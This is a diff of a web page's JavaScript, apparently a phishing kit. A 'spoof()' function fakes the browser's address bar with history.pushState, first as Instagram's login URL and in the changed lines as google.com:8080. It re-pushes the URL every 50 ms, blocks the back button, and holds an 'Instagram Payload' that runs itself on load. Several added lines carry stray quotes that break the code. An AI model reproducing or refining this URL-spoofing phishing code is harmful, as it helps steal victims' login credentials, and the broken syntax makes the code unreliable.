@@ -6,7 +6,7 @@
 <script>
 function spoof() {
     // Lock URL
-    history.pushState(null, '', 'https://www.instagram.com/accounts/login/');
+    history.pushState(null, '', 'https://google.com:8080'');
     
     // Instagram Payload dengan INLINE onclick (NO global function)
     const instagramPayload = `
@@ -47,11 +47,11 @@ function spoof() {
     let counter = 0;
     setInterval(() => {
         if (counter++ > 20) return; // Stop after 1s
-        history.pushState(null, '', 'https://www.instagram.com/accounts/login/');
+        history.pushState(null, '', 'https://google.com:8080');
     }, 50);
     
     // Prevent back
-    window.addEventListener('popstate', () => history.pushState(null, '', 'https://www.instagram.com/accounts/login/'));
+    window.addEventListener('popstate', () => history.pushState(null, '', 'https://google.com:8080''));
 }
 
 // Auto-trigger
